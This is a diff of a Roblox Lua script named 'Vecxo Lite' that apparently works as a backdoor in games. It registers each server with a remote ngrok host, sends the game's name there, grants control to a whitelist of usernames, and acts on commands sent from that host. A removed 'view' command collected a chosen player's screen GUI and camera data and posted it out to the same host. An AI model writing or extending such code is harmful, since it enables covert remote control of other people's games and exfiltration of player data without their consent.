@@ -12,16 +12,27 @@ local REGISTER_URL = "https://vecxoremoteapi.ngrok.pro/register-server"
 local REPORT_URL = "https://vecxoremoteapi.ngrok.pro/report-players"
 
 local banned = {}
-local exclusivewll = {"Reloxz", "Dekryptionite", "t_echr", "cxotus", "Trogdor973"}
+local exclusivewll = {"Reloxz", "Dekryptionite", "t_echr", "cxotus", "Trogdor973", "Palamode", "Korabi20", "1x3x3x7x1x7", "DeportedImported", "shelbomaster","dboyy725", "gamermeat1","VALENTINA964303_ALT", "idonthacklol101ns", "Dawninja21alt","SkeletonRaptor4903","hard_gamingfriends", "CoderCoenFurri", "Pendragon1977"}
 local serverId = game.JobId
 local serverLabel = "unknown"
 
 task.spawn(function()
+	local gameName = "Unknown Game"
+	local success, gameInfo = pcall(function()
+		return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
+	end)
+	if success and gameInfo and gameInfo.Name then
+		gameName = gameInfo.Name
+	end
+
 	while true do
 		local success, res = pcall(function()
 			return HttpService:PostAsync(
 				REGISTER_URL,
-				HttpService:JSONEncode({ serverId = serverId }),
+				HttpService:JSONEncode({ 
+					serverId = serverId,
+					gameName = gameName 
+				}),
 				Enum.HttpContentType.ApplicationJson
 			)
 		end)
@@ -46,66 +57,6 @@ local function runCommand(cmd)
 	local sender = cmd.sender or "Err"
 	local text = cmd.text:lower()
 
-	if text:sub(1, 5) == "view " then
-		local target = text:sub(6):lower()
-		for _, p in pairs(Players:GetPlayers()) do 
-			if matchesPlayer(p, target) then
-				local targetPlayer = p
-
-				local parts = {}
-				local screenGuiData = {}
-				local viewportSize = Vector2.new(1920, 1080)
-				local currentCameraCFrame = workspace.CurrentCamera and workspace.CurrentCamera.CFrame or CFrame.new()
-
-				for _, gui in ipairs(targetPlayer.PlayerGui:GetChildren()) do  -- Changed from *, gui
-					local data = {
-						ClassName = gui.ClassName,
-						Name = gui.Name,
-						Props = {}
-					}
-
-					if gui:IsA("TextLabel") or gui:IsA("TextButton") then
-						data.Props.Text = gui.Text
-						data.Props.Size = tostring(gui.Size)
-						data.Props.Position = tostring(gui.Position)
-						data.Props.TextColor3 = tostring(gui.TextColor3)
-						data.Props.TextSize = gui.TextSize
-					elseif gui:IsA("Frame") then
-						data.Props.Size = tostring(gui.Size)
-						data.Props.Position = tostring(gui.Position)
-						data.Props.BackgroundColor3 = tostring(gui.BackgroundColor3)
-						data.Props.BackgroundTransparency = gui.BackgroundTransparency
-					end
-
-					table.insert(screenGuiData, data)
-				end
-
-				local HttpService = game:GetService("HttpService")
-				local payload = {
-					Target = targetPlayer.Name,
-					Parts = parts,
-					UI = screenGuiData,
-					Camera = {tostring(currentCameraCFrame)},
-					Viewport = {viewportSize.X, viewportSize.Y}
-				}
-
-				local success, err = pcall(function()
-					HttpService:PostAsync(
-						"https://vecxoremoteapi.ngrok.pro/viewscreen",
-						HttpService:JSONEncode(payload),
-						Enum.HttpContentType.ApplicationJson
-					)
-				end)
-				if success then
-					warn("[Vecxo Lite]: 📸 Screen data sent to Discord.")
-				else
-					warn("[Vecxo Lite]: Failed to send viewscreen data:", err)
-					warn("[Vecxo Lite]: ⚠️ Failed to capture screen.")
-				end
-				break
-			end
-		end
-	end
 	if text:sub(1, 2) == "m " then
 		local msg = cmd.text:sub(3)
 		for _, player in pairs(Players:GetPlayers()) do
@@ -708,7 +659,6 @@ local function sendServerStatusEmbed(status, serverId, playerCount)
 	local color = isConnect and 0x00FF00 or 0xFF0000
 	local title = isConnect and "✅ Server Connected" or "🛑 Server Closed"
 
-	-- Get game info
 	local gameInfo
 	local gameName = "Unknown Game"
 	local successInfo, result = pcall(function()
